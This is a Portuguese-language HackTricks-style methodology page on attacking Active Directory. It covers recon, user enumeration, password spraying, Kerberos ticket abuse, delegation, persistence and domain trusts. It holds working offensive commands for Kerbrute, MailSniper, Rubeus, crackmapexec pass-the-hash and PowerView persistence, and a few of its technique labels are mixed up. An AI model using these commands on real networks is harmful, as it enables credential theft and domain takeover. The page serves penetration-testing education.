# Metodologia do Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

**Active Directory** serve como uma tecnologia fundamental, permitindo que **administradores de rede** criem e gerenciem de forma eficiente **domínios**, **usuários** e **objetos** dentro de uma rede. Foi projetado para escalar, facilitando a organização de um grande número de usuários em **grupos** e **subgrupos** gerenciáveis, enquanto controla **direitos de acesso** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domínios**, **árvores** e **florestas**. Um **domínio** abrange uma coleção de objetos, como **usuários** ou **dispositivos**, compartilhando um banco de dados comum. **Árvores** são grupos desses domínios vinculados por uma estrutura compartilhada, e uma **floresta** representa a coleção de múltiplas árvores, interconectadas por **relações de confiança**, formando a camada superior da estrutura organizacional. Direitos específicos de **acesso** e **comunicação** podem ser designados em cada um desses níveis.

Conceitos chave dentro do **Active Directory** incluem:

1. **Diretório** – Armazena todas as informações referentes aos objetos do Active Directory.
2. **Objeto** – Denota entidades dentro do diretório, incluindo **usuários**, **grupos**, ou **pastas compartilhadas**.
3. **Domínio** – Serve como um contêiner para objetos do diretório, com a capacidade de múltiplos domínios coexistirem dentro de uma **floresta**, cada um mantendo sua própria coleção de objetos.
4. **Árvore** – Um agrupamento de domínios que compartilham um domínio raiz comum.
5. **Floresta** – O nível máximo da estrutura organizacional no Active Directory, composto por várias árvores com **relações de confiança** entre elas.

**Active Directory Domain Services (AD DS)** engloba uma série de serviços críticos para o gerenciamento centralizado e comunicação dentro de uma rede. Esses serviços compreendem:

1. **Domain Services** – Centraliza o armazenamento de dados e gerencia as interações entre **usuários** e **domínios**, incluindo **autenticação** e funcionalidades de **busca**.
2. **Certificate Services** – Supervisiona a criação, distribuição e gerenciamento de **certificados digitais** seguros.
3. **Lightweight Directory Services** – Suporta aplicações habilitadas para diretório através do **LDAP protocol**.
4. **Directory Federation Services** – Fornece capacidades de **single-sign-on** para autenticar usuários em múltiplas aplicações web em uma única sessão.
5. **Rights Management** – Auxilia na proteção de material com direitos autorais regulando sua distribuição e uso não autorizados.
6. **DNS Service** – Crucial para a resolução de **nomes de domínio**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender como **atacar um AD** você precisa **entender** muito bem o processo de **autenticação Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Você pode acessar [https://wadcoms.github.io/](https://wadcoms.github.io) para ter uma visão rápida de quais comandos pode executar para enumerar/explorar um AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (Sem credenciais/sessões)

Se você tem apenas acesso ao ambiente do AD mas não possui credenciais/sessões, você pode:

- **Pentest the network:**
  - Faça scan da rede, encontre máquinas e portas abertas e tente **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [printers could be very interesting targets](ad-information-in-printers.md)).
  - A enumeração de DNS pode fornecer informações sobre servidores chave no domínio como web, printers, shares, vpn, media, etc.
  - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Consulte a página geral [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) para mais informações sobre como fazer isso.
- **Check for null and Guest access on smb services** (isso não funcionará em versões modernas do Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **especial atenção ao acesso anônimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
  - Coletar credenciais [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Acessar hosts abusando do [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Coletar credenciais **expondo** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Extrair usernames/nomes de documentos internos, redes sociais, serviços (principalmente web) dentro dos ambientes do domínio e também os disponíveis publicamente.
  - Se você encontrar os nomes completos dos funcionários da empresa, pode tentar diferentes convenções de **username do AD** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). As convenções mais comuns são: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
  - Ferramentas:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consulte as páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando um **username inválido é solicitado** o servidor responderá usando o **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo determinar que o username era inválido. **Usernames válidos** provocarão ou o **TGT in a AS-REP** response ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário é requerido a realizar pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra a interface MS-NRPC (Netlogon) em domain controllers. O método chama a função `DsrGetDcNameEx2` depois de fazer bind na interface MS-NRPC para verificar se o usuário ou computador existe sem quaisquer credenciais. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [aqui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se você encontrar um desses servidores na rede, você também pode realizar **user enumeration** contra ele. Por exemplo, você pode usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Você pode encontrar listas de nomes de usuário em [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) e neste ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> No entanto, você deve ter o **nome das pessoas que trabalham na empresa** a partir da etapa de recon que você deveria ter realizado antes. Com nome e sobrenome você pode usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar potenciais nomes de usuário válidos.

### Knowing one or several usernames

Ok, então você já sabe que tem um nome de usuário válido mas sem senhas... Então tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não tem** o atributo _DONT_REQ_PREAUTH_ você pode **solicitar uma AS_REP message** para esse usuário que conterá alguns dados criptografados por uma derivação da senha do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as senhas mais **comuns** com cada um dos usuários descobertos, talvez algum usuário esteja usando uma senha fraca (lembre-se da política de senhas!).
- Note que você também pode **spray OWA servers** para tentar obter acesso aos servidores de mail dos usuários.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Você pode ser capaz de **obter** alguns challenge hashes para crackear, fazendo poisoning em alguns protocolos da **rede**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se você conseguiu enumerar o Active Directory, terá **mais emails e uma melhor compreensão da rede**. Você pode ser capaz de forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obter acesso ao AD env.

### Steal NTLM Creds

Se você puder **acessar outros PCs ou shares** com o usuário **null ou guest** você poderia **colocar arquivos** (como um SCF file) que, se de alguma forma acessados, irão **trigger uma autenticação NTLM contra você** para que você possa **steal** o **NTLM challenge** para cracká-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Enumerating Active Directory WITH credentials/session

Para esta fase você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida.** Se você tem algumas credenciais válidas ou um shell como um usuário de domínio, **lembre-se que as opções dadas antes ainda são opções para comprometer outros usuários**.

Antes de iniciar a enumeração autenticada você deve saber qual é o problema do Kerberos double hop.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Ter comprometido uma conta é um **grande passo para começar a comprometer todo o domínio**, porque você vai poder começar a **Active Directory Enumeration:**

Quanto ao [**ASREPRoast**](asreproast.md) agora você pode encontrar todos os possíveis usuários vulneráveis, e quanto ao [**Password Spraying**](password-spraying.md) você pode obter uma **lista de todos os nomes de usuário** e tentar a senha da conta comprometida, senhas vazias e novas senhas promissoras.

- Você poderia usar o [**CMD para realizar um recon básico**](../basic-cmd-for-pentesters.md#domain-info)
- Você também pode usar [**powershell para recon**](../basic-powershell-for-pentesters/index.html) que será mais stealthy
- Você também pode [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informações mais detalhadas
- Outra ferramenta incrível para recon em Active Directory é [**BloodHound**](bloodhound.md). Não é **muito stealthy** (dependendo dos métodos de coleta que você usar), mas **se você não se importa** com isso, deveria experimentá-la. Encontre onde usuários podem RDP, encontre caminhos para outros grupos, etc.
- **Outras ferramentas automatizadas de enumeração AD são:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS do AD**](ad-dns-records.md) pois podem conter informações interessantes.
- Uma **ferramenta com GUI** que você pode usar para enumerar o diretório é **AdExplorer.exe** da **SysInternal** Suite.
- Você também pode procurar no banco LDAP com **ldapsearch** para procurar credenciais nos campos _userPassword_ & _unixUserPassword_, ou até em _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para outros métodos.
- Se você está usando **Linux**, você também pode enumerar o domínio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Você também poderia tentar ferramentas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraindo todos os usuários do domínio**

É muito fácil obter todos os nomes de usuário do domínio no Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção de Enumeration pareça pequena, esta é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda como enumerar um domínio e pratique até se sentir confortável. Durante um assessment, este será o momento-chave para encontrar seu caminho até DA ou para decidir que nada pode ser feito.

### Kerberoast

Kerberoasting envolve obter **TGS tickets** usados por serviços ligados a contas de usuário e crackear sua encriptação — que é baseada nas senhas dos usuários — de forma **offline**.

Mais sobre isso em:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Uma vez que você obteve algumas credenciais você pode verificar se tem acesso a alguma **máquina**. Para isso, você pode usar **CrackMapExec** para tentar conectar em vários servidores com diferentes protocolos, de acordo com suas varreduras de portas.

### Local Privilege Escalation

Se você comprometeu credenciais ou uma sessão como um usuário de domínio regular e você tem **acesso** com esse usuário a **qualquer máquina no domínio**, você deveria tentar encontrar uma forma de **escalar privilégios localmente e saquear por credenciais**. Isso porque somente com privilégios de administrador local você será capaz de **dump hashes de outros usuários** na memória (LSASS) e localmente (SAM).

Há uma página completa neste livro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e um [**checklist**](../checklist-windows-privilege-escalation.md). Além disso, não esqueça de usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

É muito **improvável** que você encontre **tickets** no usuário atual que lhe dêem permissão para acessar recursos inesperados, mas você pode verificar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se você conseguiu enumerar o Active Directory terá **mais emails e uma melhor compreensão da rede**. Você pode conseguir forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Agora que você tem algumas credenciais básicas, deve verificar se consegue **encontrar** quaisquer **arquivos interessantes sendo compartilhados dentro do AD**. Você poderia fazer isso manualmente, mas é uma tarefa muito chata e repetitiva (e ainda mais se encontrar centenas de docs que precisa checar).

[**Siga este link para aprender sobre ferramentas que você pode usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se você puder **acessar outros PCs ou shares** você pode **colocar arquivos** (como um arquivo SCF) que, se de alguma forma acessados, vão **disparar uma autenticação NTLM contra você** para que você possa **steal** o **NTLM challenge** para crackear:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Essa vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o controlador de domínio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para as técnicas a seguir um usuário de domínio comum não é suficiente, você precisa de privilégios/credenciais especiais para executar esses ataques.**

### Hash extraction

Idealmente você conseguiu **comprometer alguma conta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluindo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).  
Então, é hora de dumpar todos os hashes na memória e localmente.  
[**Leia esta página sobre diferentes maneiras de obter os hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Uma vez que você tenha o hash de um usuário**, você pode usá-lo para **impersonar** esse usuário.  
Você precisa usar alguma **ferramenta** que **execute** a **autenticação NTLM usando** esse **hash**, **ou** você pode criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, assim quando qualquer **autenticação NTLM for realizada**, esse **hash será usado.** A última opção é o que o mimikatz faz.  
[**Leia esta página para mais informações.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tem como objetivo **usar o hash NTLM do usuário para solicitar tickets Kerberos**, como uma alternativa ao comum Pass The Hash sobre o protocolo NTLM. Portanto, isso pode ser especialmente **útil em redes onde o protocolo NTLM está desabilitado** e somente **Kerberos é permitido** como protocolo de autenticação.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário** em vez de sua senha ou valores de hash. Esse ticket roubado é então usado para **impersonar o usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se você tem o **hash** ou a **senha** de um **administrador local** você deve tentar **fazer login localmente** em outros **PCs** com ele.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note que isto é bastante **ruidoso** e **LAPS** iria **mitigar** isto.

### MSSQL Abuse & Trusted Links

Se um usuário tem privilégios para **acessar instâncias MSSQL**, ele pode usá-las para **executar comandos** no host MSSQL (se estiver executando como SA), **roubar** o **hash** NetNTLM ou até realizar um **relay** **attack**.\
Além disso, se uma instância MSSQL for confiável (database link) por outra instância MSSQL, se o usuário tiver privilégios sobre o banco de dados confiável, ele poderá **usar a relação de confiança para executar queries também na outra instância**. Essas trusts podem ser encadeadas e, em algum ponto, o usuário pode encontrar um banco de dados mal configurado onde ele pode executar comandos.\
**Os links entre bancos de dados funcionam mesmo através de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suites de inventário e deployment de terceiros frequentemente expõem caminhos poderosos para credenciais e execução de código. Veja:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se você encontrar qualquer objeto Computer com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e tiver privilégios de domínio na máquina, você poderá fazer dump de TGTs da memória de todos os usuários que fizerem logon na máquina.\
Então, se um **Domain Admin fizer logon na máquina**, você poderá extrair seu TGT e se passar por ele usando [Pass the Ticket](pass-the-ticket.md).\
Graças ao constrained delegation você poderia até **comprometer automaticamente um Print Server** (esperançosamente será um DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se um usuário ou computador estiver permitido para "Constrained Delegation" ele poderá **se passar por qualquer usuário para acessar alguns serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computador você será capaz de **se passar por qualquer usuário** (até domain admins) para acessar alguns serviços.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Ter privilégio de **WRITE** sobre um objeto Active Directory de um computador remoto permite a obtenção de execução de código com **privilégios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

O usuário comprometido pode ter alguns **privilégios interessantes sobre objetos de domínio** que podem permitir que você **movimente-se** lateralmente/**eleve** privilégios.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Descobrir um **Spool service escutando** dentro do domínio pode ser **abusado** para **adquirir novas credenciais** e **elevar privilégios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **outros usuários** **acessarem** a **máquina comprometida**, é possível **coletar credenciais da memória** e até **injetar beacons em seus processos** para se passar por eles.\
Geralmente usuários acessam o sistema via RDP, então aqui você tem como realizar alguns ataques sobre sessões RDP de terceiros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornece um sistema para gerenciar a **senha do Administrator local** em computadores juntados ao domínio, garantindo que seja **aleatória**, única e frequentemente **alterada**. Essas senhas são armazenadas no Active Directory e o acesso é controlado através de ACLs para usuários autorizados apenas. Com permissões suficientes para acessar essas senhas, o pivot para outros computadores se torna possível.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Coletar certificados** da máquina comprometida pode ser uma forma de escalar privilégios dentro do ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se **templates vulneráveis** estiverem configurados é possível abusá-los para escalar privilégios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Uma vez que você obtenha privilégios de **Domain Admin** ou, ainda melhor, **Enterprise Admin**, você pode **extrair** o **banco de dados do domínio**: _ntds.dit_.

[**Mais informação sobre DCSync attack pode ser encontrada aqui**](dcsync.md).

[**Mais informação sobre como roubar o NTDS.dit pode ser encontrada aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algumas das técnicas discutidas antes podem ser usadas para persistência.\
Por exemplo, você poderia:

- Tornar usuários vulneráveis a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Tornar usuários vulneráveis a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilégios [**DCSync**](#dcsync) a um usuário

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

O ataque **Silver Ticket** cria um **Ticket Granting Service (TGS) legítimo** para um serviço específico usando o **hash NTLM** (por exemplo, o **hash da conta do PC**). Esse método é empregado para **acessar os privilégios do serviço**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um ataque **Golden Ticket** envolve um atacante obtendo acesso ao **hash NTLM da conta krbtgt** em um ambiente Active Directory (AD). Essa conta é especial porque é usada para assinar todos os **Ticket Granting Tickets (TGTs)**, que são essenciais para autenticação dentro da rede AD.

Uma vez que o atacante obtém esse hash, ele pode criar **TGTs** para qualquer conta que escolher (ataque Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

São como golden tickets forjados de uma forma que **bypassa mecanismos comuns de detecção de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Ter certificados de uma conta ou ser capaz de requisitá-los** é uma ótima forma de persistir na conta do usuário (mesmo que ele mude a senha):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usar certificados também é possível para persistir com altos privilégios dentro do domínio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

O objeto **AdminSDHolder** no Active Directory garante a segurança de **grupos privilegiados** (como Domain Admins e Enterprise Admins) aplicando uma **ACL** padrão através desses grupos para prevenir alterações não autorizadas. Contudo, esse recurso pode ser explorado; se um atacante modificar a ACL do AdminSDHolder para dar acesso total a um usuário comum, esse usuário obtém controle extenso sobre todos os grupos privilegiados. Essa medida de segurança, pensada para proteger, pode assim se tornar uma falha se não for monitorada de perto.

[**Mais informações sobre AdminDSHolder Group aqui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe uma conta de **administrador local**. Ao obter direitos de admin em tal máquina, o hash do Administrator local pode ser extraído usando **mimikatz**. Em seguida, é necessária uma modificação no registro para **habilitar o uso dessa senha**, permitindo acesso remoto à conta Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Você poderia **conceder** algumas **permissões especiais** a um **usuário** sobre alguns objetos específicos do domínio que permitirão ao usuário **elevar privilégios no futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Os **security descriptors** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** outro **objeto**. Se você puder apenas **fazer** uma **pequena alteração** no **security descriptor** de um objeto, pode obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Altere o **LSASS** na memória para estabelecer uma **senha universal**, concedendo acesso a todas as contas do domínio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Saiba o que é um SSP (Security Support Provider) aqui.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar** em **clear text** as **credenciais** usadas para acessar a máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra um **novo Domain Controller** no AD e o usa para **empurrar atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar quaisquer **logs** sobre as **modificações**. Você **precisa de DA** privilégios e estar dentro do **root domain**.\
Note que se você usar dados errados, logs bem feios aparecerão.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente discutimos como escalar privilégios se você tiver **permissão suficiente para ler senhas LAPS**. Entretanto, essas senhas também podem ser usadas para **manter persistência**.\
Confira:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

A Microsoft vê a **Floresta** como o limite de segurança. Isso implica que **comprometer um único domínio pode potencialmente levar ao comprometimento de toda a Floresta**.

### Basic Information

Uma [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite que um usuário de um **domínio** acesse recursos em outro **domínio**. Essencialmente cria uma ligação entre os sistemas de autenticação dos dois domínios, permitindo que verificações de autenticação fluam sem atrito. Quando domínios configuram uma trust, eles trocam e retêm chaves específicas dentro de seus **Domain Controllers (DCs)**, que são cruciais para a integridade da trust.

Em um cenário típico, se um usuário pretende acessar um serviço em um **domínio confiável**, ele deve primeiro solicitar um ticket especial conhecido como **inter-realm TGT** do DC de seu próprio domínio. Esse TGT é criptografado com uma **chave** compartilhada que ambos os domínios concordaram. O usuário então apresenta esse TGT ao **DC do domínio confiável** para obter um ticket de serviço (**TGS**). Após a validação bem-sucedida do inter-realm TGT pelo DC do domínio confiável, ele emite um TGS, concedendo ao usuário acesso ao serviço.

**Passos**:

1. Um **client computer** em **Domain 1** inicia o processo usando seu **NTLM hash** para solicitar um **Ticket Granting Ticket (TGT)** de seu **Domain Controller (DC1)**.
2. DC1 emite um novo TGT se o cliente for autenticado com sucesso.
3. O cliente então solicita um **inter-realm TGT** de DC1, que é necessário para acessar recursos em **Domain 2**.
4. O inter-realm TGT é criptografado com uma **trust key** compartilhada entre DC1 e DC2 como parte da trust bidirecional entre domínios.
5. O cliente leva o inter-realm TGT ao **Domain Controller (DC2)** de **Domain 2**.
6. DC2 verifica o inter-realm TGT usando sua trust key compartilhada e, se for válido, emite um **Ticket Granting Service (TGS)** para o servidor em Domain 2 que o cliente deseja acessar.
7. Finalmente, o cliente apresenta esse TGS ao servidor, que é criptografado com o hash da conta do servidor, para obter acesso ao serviço em Domain 2.

### Different trusts

É importante notar que **uma trust pode ser 1 way ou 2 ways**. Na opção de 2 ways, ambos os domínios confiarão um no outro, mas na relação de **1 way** um dos domínios será o **trusted** e o outro o **trusting**. Nesse último caso, **você só poderá acessar recursos dentro do trusting domain a partir do trusted**.

Se Domain A confia em Domain B, A é o trusting domain e B é o trusted. Além disso, em **Domain A**, isto seria uma **Outbound trust**; e em **Domain B**, isto seria uma **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Esta é uma configuração comum dentro da mesma floresta, onde um child domain tem automaticamente uma trust transitiva bidirecional com seu parent domain. Essencialmente, isso significa que solicitações de autenticação podem fluir entre o parent e o child sem dificuldades.
- **Cross-link Trusts**: Referidas como "shortcut trusts", estas são estabelecidas entre child domains para acelerar processos de referral. Em florestas complexas, os referrals de autenticação normalmente têm que ir até a root da floresta e então descer até o domínio alvo. Ao criar cross-links, a jornada é encurtada, o que é especialmente benéfico em ambientes geograficamente dispersos.
- **External Trusts**: Estas são configuradas entre domínios diferentes e não relacionados e são por natureza non-transitive. Segundo a [documentação da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts são úteis para acessar recursos em um domínio fora da floresta atual que não está conectado por uma forest trust. A segurança é reforçada através de SID filtering com external trusts.
- **Tree-root Trusts**: Estas trusts são automaticamente estabelecidas entre o dominio root da floresta e um novo tree root adicionado. Embora não sejam comumente encontradas, tree-root trusts são importantes para adicionar novas domain trees a uma floresta, permitindo que mantenham um nome de domínio único e garantindo transitividade bidirecional. Mais informações podem ser encontradas no [guia da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust é uma trust transitiva bidirecional entre dois forest root domains, também aplicando SID filtering para reforçar medidas de segurança.
